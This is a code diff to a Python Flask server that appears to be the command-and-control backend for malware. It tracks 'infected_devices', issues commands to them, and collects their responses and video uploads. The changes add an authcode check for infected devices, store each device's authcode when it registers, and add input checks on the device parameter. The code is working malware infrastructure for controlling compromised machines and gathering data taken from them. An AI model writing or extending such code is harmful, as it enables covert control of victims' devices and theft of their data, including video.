@@ -18,10 +18,10 @@ def _readf():
       
   with open(DATA, "r") as file:
     return json.load(file)
-def _writef(data, indents=2):
+def _writef(data):
   """ Writes the given data to the data.json file in a formatted manner. """
   with open(DATA, "w") as file:
-    json.dump(data, file, indent=indents)
+    json.dump(data, file, indent=2)
 
 def load_data(path_str):
   """ Reads the value at path specified in the data.json. """
@@ -32,7 +32,7 @@ def load_data(path_str):
     else:
       return None
   return file
-def write_data(path_str, value, indentation=2):
+def write_data(path_str, value):
   """ Writes the value at path specified in the data.json. """
   root = _readf()
   current = root
@@ -44,7 +44,7 @@ def write_data(path_str, value, indentation=2):
     current = current[key]
 
   current[keys[-1]] = value
-  _writef(root, indentation)
+  _writef(root)
 def delete_data(path_str):
   root = _readf()
   current = root
@@ -60,21 +60,36 @@ def delete_data(path_str):
     _writef(root)
 
 @app.route("/")
-def home():
-  return send_file("templates/index.html")
+def home(): return send_file("templates/index.html")
 
 @app.route("/success")
-def success():
-  return send_file("templates/success/index.html")
+def success(): return send_file("templates/success/index.html")
 
 @app.route("/fatal")
-def fatal():
-  return send_file("templates/fatal/index.html")
+def fatal(): return send_file("templates/fatal/index.html")
+
+@app.route("/auth", methods=["POST"])
+def auth():
+  DEVICE = request.args.get('device', '').upper()
+  if not DEVICE: return jsonify({'status': 'fatal', 'message': 'malformed req'}), 400
+  
+  message = request.get_json(force=True, silent=True) or {}
+  CODE_BY_DEVICE = message.get('authcode', '')
+  ACTUAL_CODE = load_data(f'infected_devices.{DEVICE}.authcode')
+
+  if CODE_BY_DEVICE == ACTUAL_CODE:
+    write_data(f'infected_devices.{DEVICE}.state', 'verified')
+    return jsonify({'status': 'success'}), 200
+  else: 
+    write_data(f'infected_devices.{DEVICE}.state', 'unverified')
+    return jsonify({'status': 'fatal', 'message': 'non-matching authcode'}), 401
 
 @app.route("/commands", methods=["POST", "GET"])
 def commands():    
   INFECTED_DEVICES = load_data("infected_devices")
-  DEVICE = request.args.get('device').upper()
+  DEVICE = request.args.get('device', '').upper()
+  if not DEVICE: return jsonify({'status': 'fatal', 'message': 'malformed req'}), 400
+  
   if request.method == 'POST':
     message = request.get_json(force=True, silent=True) or {}
     req = message.get('request', '')
@@ -86,10 +101,11 @@ def commands():
       DATA = message['new-device']
       DEVICE_NAME = DATA.get('name', '').upper()
       OWNER = DATA.get('owner')
+      AUTHCODE = DATA.get('authcode')
       if DEVICE_NAME not in INFECTED_DEVICES:
         write_data(
           f'infected_devices.{DEVICE_NAME}', 
-          {'state': 'unverified', 'owner': OWNER}
+          {'state': 'unverified', 'owner': OWNER, 'authcode': AUTHCODE}
         )
       return jsonify({'status': 'success'}), 200
     elif 'delete-all-devices' in req:
@@ -122,7 +138,9 @@ def commands():
 @app.route("/responses", methods=["POST", "GET"])
 def responses_path():
   INFECTED_DEVICES = load_data('infected_devices')
-  DEVICE = request.args.get('device').upper()
+  DEVICE = request.args.get('device', '').upper()
+  if not DEVICE: return jsonify({'status': 'fatal', 'message': 'malformed req'}), 400
+  
   if request.method == 'POST':
     # WebClient Video Submission Handler
     if request.files and request.form:
@@ -145,7 +163,7 @@ def responses_path():
       
       return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404
   elif request.method == 'GET':
-    RESPONSES = load_data(f'responses')
+    RESPONSES = load_data(f'responses.{DEVICE}')
     if DEVICE in INFECTED_DEVICES:
       delete_data(f'responses.{DEVICE}')
       return jsonify(RESPONSES), 200
